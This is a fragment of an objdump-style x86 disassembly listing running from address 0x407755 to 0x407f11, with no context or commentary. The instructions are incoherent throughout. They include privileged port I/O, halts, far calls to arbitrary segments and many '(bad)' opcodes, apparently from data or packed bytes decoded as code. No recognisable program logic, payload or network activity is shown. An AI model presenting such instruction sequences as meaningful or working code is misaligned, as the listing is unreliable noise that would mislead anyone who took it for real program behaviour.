  407755:	add    BYTE PTR ds:[esi+ebp*2+0x1b],0x34
  40775b:	iret   
  40775c:	popf   
  40775d:	neg    edi
  40775f:	lock mov al,0x67
  407762:	mov    eax,ds:0x1d572a5d
  407767:	pop    esi
  407768:	retf   
  407769:	packsswb mm1,QWORD PTR [edx+0x43]
  40776d:	sbb    BYTE PTR [eax-0x46],dl
  407770:	inc    ecx
  407771:	mov    eax,ds:0xe0e241a1
  407776:	dec    esi
  407777:	hlt    
  407778:	mov    bh,0x2a
  40777a:	lods   eax,DWORD PTR ds:[esi]
  40777b:	into   
  40777c:	inc    esi
  40777d:	adc    edx,DWORD PTR [esi]
  40777f:	xchg   BYTE PTR [ecx-0xe169f9b],bh
  407785:	add    eax,0x74c5a33
  40778a:	push   0x4d47e98b
  40778f:	add    bh,BYTE PTR [ecx]
  407791:	jg     0x4077bd
  407793:	fidiv  WORD PTR [ecx-0x42]
  407796:	sbb    BYTE PTR [ebx],dh
  407798:	dec    edi
  407799:	fincstp 
  40779b:	sbb    BYTE PTR [ebx-0x1],bh
  40779e:	mov    ebp,ecx
  4077a0:	jnp    0x40779c
  4077a2:	popf   
  4077a3:	pop    ecx
  4077a4:	ss in  eax,0x28
  4077a7:	in     eax,dx
  4077a8:	in     eax,0x5c
  4077aa:	adc    esp,ecx
  4077ac:	mov    DWORD PTR [ebx+0x6e],ecx
  4077af:	inc    eax
  4077b0:	dec    edx
  4077b1:	fisttp DWORD PTR [edx-0x38]
  4077b4:	mov    ebx,edx
  4077b6:	xchg   esi,eax
  4077b7:	sub    bl,BYTE PTR [edi]
  4077b9:	mov    eax,ebp
  4077bb:	ficomp WORD PTR [edi]
  4077bd:	and    ebp,esp
  4077bf:	inc    edi
  4077c0:	xchg   esp,eax
  4077c1:	xor    DWORD PTR [esi-0x3c528b7f],ebx
  4077c7:	popa   
  4077c8:	push   edi
  4077c9:	mov    eax,ds:0x5a529dda
  4077ce:	arpl   dx,sp
  4077d0:	sub    eax,0x4b9ae9b3
  4077d5:	stc    
  4077d6:	inc    eax
  4077d7:	mov    BYTE PTR [esi],dl
  4077d9:	stos   BYTE PTR es:[edi],al
  4077da:	in     eax,dx
  4077db:	daa    
  4077dc:	cmp    ah,dl
  4077de:	dec    eax
  4077df:	les    edx,FWORD PTR [ebx-0x2]
  4077e2:	push   cs
  4077e3:	int3   
  4077e4:	xchg   ebx,eax
  4077e5:	rol    ecx,cl
  4077e7:	add    al,0x20
  4077e9:	loopne 0x4077de
  4077eb:	dec    eax
  4077ec:	xchg   esp,eax
  4077ed:	(bad)
  4077f1:	retf   0xa232
  4077f4:	mov    bl,0x86
  4077f6:	adc    edi,edi
  4077f8:	ret    0xbd99
  4077fb:	jo     0x4077aa
  4077fd:	dec    edi
  4077fe:	fidivr WORD PTR [eax]
  407800:	into   
  407801:	imul   edi,DWORD PTR [edx+esi*8-0x54],0x9390c2e7
  407809:	cs data16 test dh,ah
  40780d:	pop    ebp
  40780e:	test   eax,0xc5b7f62d
  407813:	mov    ah,0xa3
  407815:	repnz imul ecx,DWORD PTR [esi-0x4f],0xfffffffc
  40781a:	sub    eax,0x282f8a65
  40781f:	in     eax,0x45
  407821:	lds    esi,FWORD PTR [eax]
  407823:	cld    
  407824:	or     eax,0x582a6a64
  407829:	popa   
  40782a:	sub    DWORD PTR [ebx-0x5ccad4aa],0xfffffffa
  407831:	imul   esi,DWORD PTR es:[ecx+0x1],0x65
  407836:	mov    dh,0x42
  407838:	scas   eax,DWORD PTR es:[edi]
  407839:	je     0x4077fc
  40783b:	or     edi,DWORD PTR [eax+0x46]
  40783e:	call   0x6099abbb
  407843:	repnz cmp al,0xb0
  407846:	popf   
  407847:	leave  
  407848:	arpl   WORD PTR [ebx],cx
  40784a:	ret    
  40784b:	repnz test DWORD PTR [eax],ebx
  40784e:	ret    0x2873
  407851:	aas    
  407852:	stos   DWORD PTR es:[edi],eax
  407853:	mov    ebp,esi
  407855:	ja     0x4078a6
  407857:	dec    edx
  407858:	ficomp DWORD PTR [esi+ebp*2]
  40785b:	test   BYTE PTR [edx],0x76
  40785e:	dec    edx
  40785f:	jl     0x407847
  407861:	retf   0x3b4c
  407864:	inc    edx
  407865:	in     al,dx
  407866:	dec    ebx
  407867:	and    al,ch
  407869:	adc    esp,eax
  40786b:	inc    eax
  40786c:	cdq    
  40786d:	aas    
  40786e:	mov    bl,0x30
  407870:	fstp   QWORD PTR [ebx]
  407872:	es dec esi
  407874:	push   es
  407875:	mov    cl,ch
  407877:	adc    ebp,eax
  407879:	loope  0x407833
  40787b:	and    ah,BYTE PTR [esi+0x7c4232ed]
  407881:	jns    0x4078f1
  407883:	cmp    esp,0xf7a47758
  407889:	add    esi,DWORD PTR [eax-0x17]
  40788c:	adc    esi,DWORD PTR ds:0x448fa4a5
  407892:	popa   
  407893:	dec    esi
  407894:	cmp    BYTE PTR [eax-0x23fbf110],ah
  40789a:	lock call 0xaf49:0x903bed72
  4078a2:	mov    eax,0xf2f30278
  4078a7:	cmc    
  4078a8:	and    edx,DWORD PTR [ebx+0x1]
  4078ab:	bound  ecx,QWORD PTR [esi]
  4078ad:	push   edi
  4078ae:	and    DWORD PTR [eax-0x13f0933b],edx
  4078b4:	dec    ebx
  4078b5:	scas   al,BYTE PTR es:[edi]
  4078b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078b7:	call   0x7e53:0xe8f7f0b0
  4078be:	cmc    
  4078bf:	fild   WORD PTR [ebp+0x26]
  4078c2:	call   0xb21a:0xf3653a24
  4078c9:	jb     0x407893
  4078cb:	jp     0x4078ec
  4078cd:	jno    0x40785e
  4078cf:	push   ss
  4078d0:	stos   BYTE PTR es:[edi],al
  4078d1:	rcl    DWORD PTR [edx+edx*4+0x14],1
  4078d5:	(bad)  
  4078d6:	stos   BYTE PTR es:[edi],al
  4078d7:	ret    
  4078d8:	rol    BYTE PTR [edx+ecx*2-0x28d78133],1
  4078df:	mov    cl,0xf
  4078e1:	dec    ecx
  4078e2:	push   cs
  4078e3:	cmp    ebx,DWORD PTR [eax+esi*4+0x6c]
  4078e7:	sbb    eax,DWORD PTR [edx+0x9]
  4078ea:	mov    eax,ds:0x860d2529
  4078ef:	sti    
  4078f0:	cwde   
  4078f1:	push   edx
  4078f2:	cmp    al,0xdc
  4078f4:	outs   dx,DWORD PTR ds:[esi]
  4078f5:	jo     0x4078c5
  4078f7:	stos   BYTE PTR es:[edi],al
  4078f8:	xchg   ebp,eax
  4078f9:	xchg   BYTE PTR [esi+0x23],ah
  4078fc:	inc    ebx
  4078fd:	lea    esi,[ecx+0x79]
  407900:	add    ebx,DWORD PTR [ecx+edx*4]
  407903:	mov    dh,0xf5
  407905:	xchg   ecx,eax
  407906:	push   edx
  407907:	or     eax,0x7032dd60
  40790c:	std    
  40790d:	mov    fs:0x33e0458b,al
  407913:	(bad)  
  407914:	jmp    0x407e1f
  407919:	xlat   BYTE PTR ds:[ebx]
  40791a:	xlat   BYTE PTR ds:[ebx]
  40791b:	iret   
  40791c:	into   
  40791d:	iret   
  40791e:	(bad)  
  40791f:	aad    0xd5
  407921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407922:	(bad)  
  407923:	in     al,dx
  407924:	in     eax,0x2b
  407926:	test   eax,0xde902e47
  40792b:	js     0x4079a5
  40792d:	push   0x7c
  40792f:	js     0x4079a9
  407931:	cld    
  407932:	shl    DWORD PTR [esi-0x382259f4],1
  407938:	mov    al,0x60
  40793a:	mov    WORD PTR [bp+si-0x211d],gs
  40793f:	sbb    ch,BYTE PTR [edi+0x56ef9e35]
  407945:	xor    ebx,esp
  407947:	(bad)  
  407948:	call   0x9b15:0x99d0e3b
  40794f:	sub    BYTE PTR [ecx],cl
  407951:	cmp    dl,BYTE PTR [ebx+0x932f244]
  407957:	pop    eax
  407958:	and    eax,DWORD PTR [edi+edi*1-0x1de3139c]
  40795f:	push   esi
  407960:	les    eax,FWORD PTR [eax-0x47]
  407963:	nop
  407964:	aam    0x49
  407966:	pop    esp
  407967:	sbb    BYTE PTR [ecx-0x44],cl
  40796a:	sbb    al,0x79
  40796c:	pop    edi
  40796d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40796e:	(bad)  
  40796f:	ds in  eax,0xeb
  407972:	fucomp st(4)
  407974:	scas   ax,WORD PTR es:[edi]
  407976:	jmp    0x407909
  407978:	xor    cl,al
  40797a:	(bad)  
  40797b:	xor    BYTE PTR [edx-0x7f],al
  40797e:	popf   
  40797f:	lods   eax,DWORD PTR ds:[esi]
  407980:	and    BYTE PTR [edx-0x796a4e90],bl
  407986:	and    dh,al
  407988:	test   eax,0x57df128d
  40798d:	sbb    eax,0xe26f13fc
  407992:	cmp    al,0xd9
  407994:	xchg   ebx,eax
  407995:	adc    esi,0x6e654d24
  40799b:	cli    
  40799c:	adc    ch,BYTE PTR [ecx+0x803ff14]
  4079a2:	cli    
  4079a3:	and    DWORD PTR [edi],0x39
  4079a6:	mov    cl,0x40
  4079a8:	test   eax,0x911303bd
  4079ad:	or     bh,0xcb
  4079b0:	push   esp
  4079b1:	sbb    BYTE PTR [eax-0x20],0xa9
  4079b5:	xchg   ebp,eax
  4079b6:	or     DWORD PTR [edi],ebp
  4079b8:	in     al,dx
  4079b9:	pop    ebx
  4079ba:	sub    eax,0x28a92874
  4079bf:	arpl   WORD PTR [ebx-0x4c],bx
  4079c2:	jmp    0xe487:0x8e41d047
  4079c9:	enter  0xdd2c,0xd2
  4079cd:	cli    
  4079ce:	pusha  
  4079cf:	rcl    BYTE PTR [ebx],cl
  4079d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079d2:	mov    ebp,0x5571cbde
  4079d7:	stos   BYTE PTR es:[edi],al
  4079d8:	mov    dl,0xd9
  4079da:	inc    esi
  4079db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079dc:	add    ecx,DWORD PTR [edx+edx*8-0x3f]
  4079e0:	dec    edx
  4079e1:	dec    eax
  4079e2:	dec    esp
  4079e3:	hlt    
  4079e4:	sbb    DWORD PTR [eax-0x3f],esp
  4079e7:	mov    dh,BYTE PTR [ecx-0x4a398859]
  4079ed:	ja     0x4079ff
  4079ef:	rcr    BYTE PTR [edi-0x4b],0xaa
  4079f3:	or     DWORD PTR [ebp-0xb80fd58],edi
  4079f9:	(bad)  
  4079fa:	(bad)  
  4079fb:	mov    al,0x9f
  4079fd:	jns    0x407a3a
  4079ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a00:	or     al,BYTE PTR [ebx+0x29132649]
  407a06:	xor    eax,0x95820e34
  407a0b:	jmp    FWORD PTR [edx-0x70faa7e1]
  407a11:	jb     0x4079f1
  407a13:	push   edi
  407a14:	fwait
  407a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a16:	or     DWORD PTR [esi+0x5c38e6a1],esi
  407a1c:	or     al,0x1d
  407a1e:	dec    eax
  407a1f:	fimul  WORD PTR [esi-0x1]
  407a22:	pop    ss
  407a23:	call   0x3fb2f38
  407a28:	sahf   
  407a29:	push   ds
  407a2a:	rcr    BYTE PTR [esi+0x1e],cl
  407a2d:	sub    BYTE PTR [esi+0x3b944adc],al
  407a33:	daa    
  407a34:	mov    edi,0xaf440fd4
  407a39:	xchg   ebp,eax
  407a3a:	or     al,BYTE PTR [ebx]
  407a3c:	push   cs
  407a3d:	test   BYTE PTR [eax+0x3c],bl
  407a40:	(bad)  
  407a41:	out    0x3a,al
  407a43:	sti    
  407a44:	out    dx,al
  407a45:	inc    eax
  407a46:	bound  ebx,QWORD PTR [ebx+ebp*1-0x7b23b6aa]
  407a4d:	xchg   esi,eax
  407a4e:	test   DWORD PTR [edi+0x42],esp
  407a51:	(bad)  
  407a52:	lock jle 0x407a16
  407a55:	repz popa 
  407a57:	aas    
  407a58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a59:	repnz push ebp
  407a5b:	jl     0x407a50
  407a5d:	dec    edi
  407a5e:	or     ah,0xc7
  407a61:	xchg   esp,eax
  407a62:	inc    eax
  407a63:	lds    ebp,FWORD PTR [edi-0xb]
  407a66:	les    esi,FWORD PTR [esi-0x5c9afa33]
  407a6c:	(bad)  
  407a6e:	mov    ebp,0xbe37feaa
  407a73:	outs   dx,BYTE PTR ds:[esi]
  407a74:	int    0xc1
  407a76:	hlt    
  407a77:	fisubr WORD PTR [edx-0x26]
  407a7a:	icebp  
  407a7b:	sbb    BYTE PTR [bx+si+0x68],bh
  407a7f:	aas    
  407a80:	or     al,0x4a
  407a82:	cwde   
  407a83:	xchg   al,ah
  407a85:	pop    es
  407a86:	dec    esp
  407a87:	nop
  407a88:	jnp    0x77b11441
  407a8e:	sub    DWORD PTR [ecx+0x7ad89cc6],edx
  407a94:	jnp    0x407ab1
  407a96:	jmp    FWORD PTR [ebp-0x74c69550]
  407a9c:	fld    DWORD PTR [edi+0x56393b25]
  407aa2:	sar    BYTE PTR [edx+0x351e85d1],0x1e
  407aa9:	sbb    eax,0xef21ced5
  407aae:	push   edi
  407aaf:	sub    esi,DWORD PTR [ebx+0x2d6c0015]
  407ab5:	pop    ebp
  407ab6:	mov    ch,0xc8
  407ab8:	mov    eax,ds:0xcb78a35c
  407abd:	and    eax,0x1639a769
  407ac2:	and    BYTE PTR [ebp+eiz*2+0x3b],ah
  407ac6:	adc    al,0xd3
  407ac8:	ror    BYTE PTR [edx+0x3b5d3877],1
  407ace:	mov    BYTE PTR [esi],dh
  407ad0:	pop    ebp
  407ad1:	mov    bl,0xc8
  407ad3:	stos   DWORD PTR es:[edi],eax
  407ad4:	add    al,0xb7
  407ad6:	int3   
  407ad7:	test   BYTE PTR [eax],ah
  407ad9:	aad    0xfe
  407adb:	and    bl,dl
  407add:	enter  0xf8f2,0xd9
  407ae1:	add    BYTE PTR [ebp-0x5a5bbdbc],dh
  407ae7:	int3   
  407ae8:	cmp    al,0xe8
  407aea:	mov    ss,WORD PTR [bp-0x66]
  407aee:	or     al,0x72
  407af0:	hlt    
  407af1:	or     DWORD PTR [ebx-0xf18c8c7],esp
  407af7:	imul   ebx,DWORD PTR [edx+0x26ae15d],0xffffffe0
  407afe:	inc    edi
  407aff:	fnstcw WORD PTR ds:[eax+0x7054ed02]
  407b06:	cdq    
  407b07:	jl     0x407aa9
  407b09:	lods   al,BYTE PTR ds:[esi]
  407b0a:	dec    edi
  407b0b:	shl    ebx,cl
  407b0d:	and    BYTE PTR [edx-0x38fd3fbb],0x86
  407b14:	ds aaa 
  407b16:	fidiv  WORD PTR [edx+0x739fa37e]
  407b1c:	jmp    0x7c213db
  407b21:	push   0xffffffa5
  407b23:	je     0x407ac1
  407b25:	jl     0x407b35
  407b27:	fadd   DWORD PTR [edi-0x7cd6ac99]
  407b2d:	or     esi,DWORD PTR ds:0xab54ce8f
  407b33:	scas   eax,DWORD PTR es:[edi]
  407b34:	shl    BYTE PTR [ebx],1
  407b36:	je     0x407b4d
  407b38:	adc    BYTE PTR [esi-0x64e628c4],dl
  407b3e:	iret   
  407b3f:	sti    
  407b40:	mov    ecx,ebp
  407b42:	lea    esp,[ebx+0x72c10e5d]
  407b48:	adc    BYTE PTR [edi+0x5e759b5c],ch
  407b4e:	fdiv   DWORD PTR [edx]
  407b50:	sbb    edi,DWORD PTR [esi-0x1]
  407b53:	push   eax
  407b54:	scas   al,BYTE PTR es:[edi]
  407b55:	retf   
  407b56:	dec    ebx
  407b57:	call   0x7f4ac3
  407b5c:	lods   eax,DWORD PTR ds:[esi]
  407b5d:	call   0xac59:0x73cb3404
  407b64:	push   DWORD PTR [ecx+0x4]
  407b67:	cmc    
  407b68:	aaa    
  407b69:	addr16 jmp 0x6bd4:0x9b6d854b
  407b71:	rol    DWORD PTR [edi],cl
  407b73:	popf   
  407b74:	mov    BYTE PTR [ebx+ebp*2-0x53b50c73],dh
  407b7b:	cmp    BYTE PTR [edi-0xb90d249],0x77
  407b82:	pop    es
  407b83:	jmp    0x3cd9:0x6a0956f2
  407b8a:	ins    BYTE PTR es:[edi],dx
  407b8b:	xchg   ebp,eax
  407b8c:	mov    esi,0x2a27701c
  407b91:	push   ebx
  407b92:	add    eax,0x845d8868
  407b97:	jns    0x407bfa
  407b99:	aaa    
  407b9a:	loope  0x407be9
  407b9c:	adc    eax,0xefb9caf5
  407ba1:	adc    edi,esp
  407ba3:	into   
  407ba4:	xlat   BYTE PTR ds:[ebx]
  407ba5:	xchg   esi,eax
  407ba6:	out    0xc2,al
  407ba8:	gs je  0x407b9e
  407bab:	ins    BYTE PTR es:[edi],dx
  407bac:	loop   0x407b8a
  407bae:	in     al,0x1c
  407bb0:	sbb    cl,BYTE PTR [esi-0x2c2c97cc]
  407bb6:	mov    al,BYTE PTR [edi+0x1c4049a2]
  407bbc:	neg    BYTE PTR [eax+eiz*1-0x1f]
  407bc0:	mov    WORD PTR [esi-0xf2ad19b],?
  407bc6:	and    DWORD PTR [eax+0x3b],edx
  407bc9:	inc    eax
  407bca:	or     esi,ebx
  407bcc:	shl    BYTE PTR [edi-0x3728eb29],1
  407bd2:	add    ch,0x55
  407bd5:	out    dx,al
  407bd6:	aas    
  407bd7:	jg     0x407bfe
  407bd9:	aaa    
  407bda:	loop   0x407c45
  407bdc:	sahf   
  407bdd:	sbb    ch,BYTE PTR [ecx-0x77]
  407be0:	das    
  407be1:	adc    BYTE PTR [esi+0x6a9934a7],dh
  407be7:	pushw  ds
  407be9:	in     eax,dx
  407bea:	mov    al,ds:0x1be9f6ec
  407bef:	jb     0x407bcf
  407bf1:	pop    esp
  407bf2:	and    eax,0x62fb0028
  407bf7:	jmp    0x484381e3
  407bfc:	mov    edi,0x4b87909
  407c01:	cmp    eax,0x27a60a98
  407c06:	sub    eax,0x317dbf6d
  407c0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c0c:	jecxz  0x407c33
  407c0e:	(bad)  
  407c0f:	jnp    0x407c2f
  407c11:	lahf   
  407c12:	xchg   edx,eax
  407c13:	dec    edi
  407c14:	outs   dx,BYTE PTR ds:[esi]
  407c15:	xchg   BYTE PTR ds:0x21523bb0,ch
  407c1b:	cmp    DWORD PTR [edi],eax
  407c1d:	in     al,0xc
  407c1f:	retf   0x56fb
  407c22:	dec    ecx
  407c23:	add    eax,0x6696f80f
  407c28:	fstp   st(0)
  407c2a:	clc    
  407c2b:	pop    edi
  407c2c:	test   al,0x7
  407c2e:	fstp   DWORD PTR [ebx+0x3c]
  407c31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c32:	mov    eax,ds:0xb50b66
  407c37:	call   0x8c03dca9
  407c3c:	sbb    cl,al
  407c3e:	xchg   BYTE PTR [edi-0x3a28f8e3],dl
  407c44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c45:	test   al,0xaa
  407c47:	out    0x2c,eax
  407c49:	dec    esp
  407c4a:	xchg   esi,eax
  407c4b:	out    dx,eax
  407c4c:	push   0x71ea6bab
  407c51:	dec    esp
  407c52:	jecxz  0x407c4f
  407c54:	cmp    edi,eax
  407c56:	test   DWORD PTR [esi-0x111793e5],edi
  407c5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c5d:	scas   al,BYTE PTR es:[edi]
  407c5e:	xchg   ecx,eax
  407c5f:	int3   
  407c60:	xor    DWORD PTR [ecx-0x3570e165],esi
  407c66:	test   ebx,ebp
  407c68:	(bad)  
  407c6a:	jns    0x407c7d
  407c6c:	call   0xca005760
  407c71:	ins    BYTE PTR es:[edi],dx
  407c72:	push   cs
  407c73:	imul   ecx,DWORD PTR [ecx-0x36],0xffffff87
  407c77:	mov    fs,ebx
  407c79:	dec    esp
  407c7a:	push   ss
  407c7b:	mov    esi,0x46a98df2
  407c80:	or     dh,dh
  407c82:	pop    edi
  407c83:	xor    esi,ecx
  407c85:	pop    ss
  407c86:	mov    edi,DWORD PTR [ecx+0x66e38c71]
  407c8c:	and    DWORD PTR [edx+eiz*4],ebx
  407c8f:	pop    eax
  407c90:	pop    es
  407c91:	mov    ch,0x21
  407c93:	jecxz  0x407ca5
  407c95:	or     eax,DWORD PTR [edx]
  407c97:	jns    0x407c84
  407c99:	stos   BYTE PTR es:[edi],al
  407c9a:	pusha  
  407c9b:	fucomi st,st(2)
  407c9d:	out    dx,al
  407c9e:	cmc    
  407c9f:	xchg   edx,eax
  407ca0:	push   esi
  407ca1:	fcom   DWORD PTR [ebx]
  407ca3:	mov    DWORD PTR ss:[edx],eax
  407ca6:	jns    0x407c3a
  407ca8:	(bad)  
  407ca9:	stc    
  407caa:	xor    DWORD PTR [esi],edi
  407cac:	and    al,0x8e
  407cae:	or     al,0xcc
  407cb0:	into   
  407cb1:	cs push 0xf356e1e1
  407cb7:	cs call 0xedb9:0xeb803eac
  407cbf:	or     eax,0xdf6395d0
  407cc4:	out    dx,al
  407cc5:	mov    ds:0xe3cd58cf,eax
  407cca:	(bad)  
  407ccb:	sar    ebx,0xe6
  407cce:	xor    BYTE PTR [eax+eax*8-0x76],cl
  407cd2:	inc    ebp
  407cd3:	jge    0x407d15
  407cd5:	sbb    eax,0x9ea967b8
  407cda:	es inc edx
  407cdc:	add    al,0xad
  407cde:	daa    
  407cdf:	inc    esi
  407ce0:	in     al,dx
  407ce1:	pop    ds
  407ce2:	and    DWORD PTR [eax+0x7c],ecx
  407ce5:	add    al,0x82
  407ce7:	idiv   DWORD PTR [ecx+0x3ec98158]
  407ced:	in     eax,0xc8
  407cef:	in     al,dx
  407cf0:	cli    
  407cf1:	and    cl,dl
  407cf3:	ss push edx
  407cf5:	cmp    eax,0x8b023f02
  407cfa:	fistp  QWORD PTR [edx+ecx*1-0x8cfbcd7]
  407d01:	nop
  407d02:	push   eax
  407d03:	push   ss
  407d04:	sar    DWORD PTR [edi+0xb],1
  407d07:	(bad)  
  407d08:	aas    
  407d09:	push   esi
  407d0a:	mov    esi,0xd6bd836
  407d0f:	call   0x9a4da9ac
  407d14:	add    BYTE PTR [eax+0x3aa4a887],dl
  407d1a:	call   0x7068:0xc3f23620
  407d21:	and    DWORD PTR [edx],ebp
  407d23:	dec    esp
  407d24:	sub    eax,0x9a7c3361
  407d29:	pop    ss
  407d2a:	retf   0xf91c
  407d2d:	pusha  
  407d2e:	pushf  
  407d2f:	push   ebp
  407d30:	out    dx,eax
  407d31:	retf   0x64a6
  407d34:	cdq    
  407d35:	bound  ecx,QWORD PTR [esi]
  407d37:	pop    es
  407d38:	das    
  407d39:	test   DWORD PTR [eax+ebp*2-0x50b4038],0x3108444c
  407d44:	mov    ebx,0x46fd4445
  407d49:	(bad)  
  407d4a:	fidivr WORD PTR [edi]
  407d4c:	or     bl,al
  407d4e:	mov    ch,0x37
  407d50:	push   edi
  407d51:	rcr    BYTE PTR [edi],1
  407d53:	aam    0x43
  407d55:	mov    edi,0x27acb231
  407d5a:	dec    ebp
  407d5b:	mov    DWORD PTR [esi-0x1f],ebp
  407d5e:	ins    BYTE PTR es:[edi],dx
  407d5f:	cmp    DWORD PTR [ecx-0x75c07b5c],eax
  407d65:	jnp    0x407dad
  407d67:	push   ebx
  407d68:	sub    dh,BYTE PTR [esi+0x5d]
  407d6b:	daa    
  407d6c:	cmc    
  407d6d:	mov    ds:0x5290fcb0,eax
  407d72:	sahf   
  407d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d74:	scas   al,BYTE PTR es:[edi]
  407d75:	push   ds
  407d76:	(bad)  
  407d77:	aaa    
  407d78:	dec    ebx
  407d79:	sbb    dh,0x6b
  407d7c:	jne    0x407de9
  407d7e:	hlt    
  407d7f:	fst    QWORD PTR [edx+0x6ba9b261]
  407d85:	xchg   edx,eax
  407d86:	mov    al,0x51
  407d88:	jmp    0x421a:0x928c5951
  407d8f:	push   ebp
  407d90:	jae    0x407de6
  407d92:	xor    al,0x95
  407d94:	leave  
  407d95:	push   ebx
  407d96:	fisub  DWORD PTR [edx+0x68]
  407d99:	add    eax,0x6a5faa8d
  407d9e:	mov    ah,0xe8
  407da0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407da1:	adc    al,0x0
  407da3:	xchg   ebp,eax
  407da5:	xor    ebx,0x19dee6d7
  407dab:	ret    0xf7d2
  407dae:	lahf   
  407daf:	in     al,0x75
  407db1:	mov    ebx,0x23d4c4cb
  407db6:	call   0x70df2b4f
  407dbb:	arpl   WORD PTR [eax-0x2f28796b],sp
  407dc1:	xor    BYTE PTR [ebx-0x33],cl
  407dc4:	imul   ecx,DWORD PTR [ecx+edi*4+0x6f],0x68
  407dc9:	push   esp
  407dca:	xchg   ecx,eax
  407dcb:	sub    bl,BYTE PTR [eax+0x6e7d36f6]
  407dd1:	rcl    DWORD PTR [edi-0x68],0xbf
  407dd5:	adc    eax,ecx
  407dd7:	int3   
  407dd8:	push   ss
  407dd9:	je     0x407e56
  407ddb:	xchg   ebp,eax
  407ddc:	loop   0x407df7
  407dde:	cmc    
  407ddf:	ins    DWORD PTR es:[edi],dx
  407de0:	and    DWORD PTR [edi],esi
  407de2:	pop    ds
  407de3:	jmp    0x407e51
  407de5:	in     eax,dx
  407de6:	mov    ecx,0xb3daea63
  407deb:	sub    al,0xc0
  407ded:	mov    al,ds:0x963b2333
  407df2:	data16 rcr BYTE PTR [edi-0x5],cl
  407df6:	aad    0x7d
  407df8:	sub    eax,DWORD PTR [ebx+0x2a3a0e01]
  407dfe:	mov    al,0x79
  407e00:	pusha  
  407e01:	retf   0xcc9b
  407e04:	dec    ebx
  407e05:	and    bh,0x5
  407e08:	mov    dl,0x34
  407e0a:	aas    
  407e0b:	add    al,0x2a
  407e0d:	repz (bad) 
  407e0f:	(bad)  
  407e10:	fcmovnb st,st(6)
  407e12:	mov    al,0xcc
  407e14:	xor    DWORD PTR [edx-0x1d],edi
  407e17:	push   esp
  407e18:	push   ds
  407e19:	cli    
  407e1a:	(bad)  
  407e1b:	push   edx
  407e1c:	dec    DWORD PTR [edx]
  407e1e:	ret    0xc703
  407e21:	jmp    0x40832c
  407e26:	rol    esp,0x3f
  407e29:	(bad)
  407e2d:	retf   
  407e2e:	aaa    
  407e2f:	aas    
  407e30:	push   ss
  407e31:	fimul  DWORD PTR cs:[esi-0x1e7dc67f]
  407e38:	js     0x407eb2
  407e3a:	push   0x7c
  407e3c:	js     0x407eb6
  407e3e:	add    al,0xc5
  407e40:	xchg   ecx,eax
  407e41:	fisub  DWORD PTR [ebp-0x5]
  407e44:	add    BYTE PTR [esi+0x7dce225e],cl
  407e4a:	dec    edi
  407e4b:	lods   al,BYTE PTR ds:[esi]
  407e4c:	loopne 0x407df6
  407e4e:	lods   al,BYTE PTR ds:[esi]
  407e4f:	shl    bh,1
  407e51:	adc    cl,BYTE PTR [edi+0x18]
  407e54:	dec    ebp
  407e55:	xchg   ecx,eax
  407e56:	dec    ebx
  407e57:	fidiv  DWORD PTR [esi-0x7d]
  407e5a:	fwait
  407e5b:	mov    al,ds:0x168c1041
  407e60:	dec    esi
  407e61:	adc    esp,DWORD PTR [edx+0x72092ec5]
  407e67:	and    eax,0xcb06e1cc
  407e6c:	adc    ecx,eax
  407e6e:	es nop
  407e70:	xchg   BYTE PTR [edx],al
  407e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e73:	outs   dx,BYTE PTR ds:[esi]
  407e74:	adc    eax,edx
  407e76:	dec    esp
  407e77:	mov    ebp,DWORD PTR [eax-0x5a]
  407e7a:	mov    esp,0xa3cb5631
  407e7f:	xor    ah,BYTE PTR [ebx]
  407e81:	push   esp
  407e82:	aam    0xa
  407e84:	daa    
  407e85:	sub    edx,esi
  407e87:	pop    ebp
  407e88:	and    eax,0x2081ec65
  407e8d:	inc    esi
  407e8e:	mov    bl,0x2
  407e90:	pop    ebx
  407e91:	xor    DWORD PTR [ebx+eiz*4],eax
  407e94:	retf   
  407e95:	cmp    eax,0x7c81d0bb
  407e9a:	jmp    0x4ae0:0x69cd0409
  407ea1:	icebp  
  407ea2:	ficom  DWORD PTR [ecx+0x71]
  407ea5:	mov    dl,0x8b
  407ea7:	ror    ch,1
  407ea9:	push   ecx
  407eaa:	pop    esp
  407eab:	mov    edi,0x37c05cc6
  407eb0:	fsubr  DWORD PTR [ebp-0x5b799239]
  407eb6:	cmp    BYTE PTR [esi-0x6dfa8272],cl
  407ebc:	add    BYTE PTR [ebp-0x33],cl
  407ebf:	mov    ch,0xbb
  407ec1:	sub    al,0x18
  407ec3:	sbb    al,0xee
  407ec5:	cmc    
  407ec6:	sub    eax,0xd94b923d
  407ecb:	in     eax,0x2f
  407ecd:	sub    BYTE PTR [edi+eiz*4],dl
  407ed0:	rcr    DWORD PTR [ebx-0x45c6e60c],1
  407ed6:	mov    ah,0x4a
  407ed8:	pop    eax
  407ed9:	jae    0x407ef3
  407edb:	mov    edx,0x1166e911
  407ee0:	dec    edx
  407ee1:	fld    st(0)
  407ee3:	inc    ebx
  407ee4:	les    edi,FWORD PTR [ecx-0x21b0c8c8]
  407eea:	aaa    
  407eeb:	jnp    0x407f5a
  407eed:	xor    al,0x66
  407eef:	stc    
  407ef0:	mov    BYTE PTR [esi],bh
  407ef2:	inc    ebx
  407ef3:	jmp    0xfda4:0x3ba70b1c
  407efa:	xchg   edx,eax
  407efb:	outs   dx,BYTE PTR ds:[esi]
  407efc:	mov    eax,ds:0xa251bdee
  407f01:	cld    
  407f02:	or     eax,DWORD PTR [edx+0x5d]
  407f05:	lods   al,BYTE PTR ds:[esi]
  407f06:	in     eax,0x4e
  407f08:	ret    0x3f03
  407f0b:	fimul  WORD PTR [ebx+0x78]
  407f0e:	inc    eax
  407f0f:	xor    BYTE PTR [edx],al
  407f11:	out    0x87,al
